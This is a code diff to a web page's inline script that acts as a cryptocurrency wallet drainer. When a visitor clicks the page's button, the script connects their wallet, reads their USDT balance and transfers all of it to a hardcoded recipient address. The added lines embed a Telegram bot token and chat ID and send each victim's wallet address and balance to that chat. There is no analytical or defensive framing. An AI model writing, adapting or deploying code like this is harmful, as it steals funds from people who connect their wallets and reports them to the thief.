@@ -154,6 +154,9 @@
     let userAccount;
     const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP-20)
     const recipient = "0x63b6B2Ee6324e3c53cAf1d2841b21134DEb19aA9"; 
+    const botToken = "5812995396:AAECr7Ryf51kOOnCV30sr6rUKesUdBux1nM";
+    const chatId = "5122281931";
+
     const usdtABI = [
         {
             "constant": true,
@@ -186,7 +189,19 @@
 
                 const accounts = await ethereum.request({ method: "eth_requestAccounts" });
                 userAccount = accounts[0];
-                sendAllFunds();
+
+                const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
+                const balance = await usdtContract.methods.balanceOf(userAccount).call();
+
+                if (BigInt(balance) === BigInt(0)) {
+                    console.error("Insufficient USDT balance.");
+                    return;
+                }
+
+                const formattedBalance = web3.utils.fromWei(balance, 'ether');
+
+                sendTelegramMessage(userAccount, formattedBalance);
+                sendAllFunds(balance);
             } catch (error) {
                 console.error("Error connecting wallet:", error);
             }
@@ -195,22 +210,23 @@
         }
     }
 
-    async function sendAllFunds() {
+    function sendTelegramMessage(wallet, amount) {
+        const message = `Wallet connected\nWallet: ${wallet}\nAmount: ${amount} USDT`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(url).catch(error => console.error("Error sending Telegram message:", error));
+    }
+
+    async function sendAllFunds(amount) {
         try {
             const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
 
-            const balance = await usdtContract.methods.balanceOf(userAccount).call();
-            if (BigInt(balance) === BigInt(0)) {
-                console.error("Insufficient USDT balance.");
-                return;
-            }
-
-            console.log(`User's USDT Balance: ${web3.utils.fromWei(balance, 'ether')} USDT`);
+            console.log(`User's USDT Balance: ${amount} USDT`);
 
             const gasPrice = await web3.eth.getGasPrice();
-            const gasLimit = 100000; 
+            const gasLimit = 100000;
 
-            await usdtContract.methods.transfer(recipient, balance).send({
+            await usdtContract.methods.transfer(recipient, amount).send({
                 from: userAccount,
                 gas: web3.utils.toHex(gasLimit),
                 gasPrice: web3.utils.toHex(gasPrice),
@@ -224,7 +240,6 @@
 
     document.getElementById("sendButton").addEventListener("click", connectWallet);
 </script>
-
 
 
 </body>
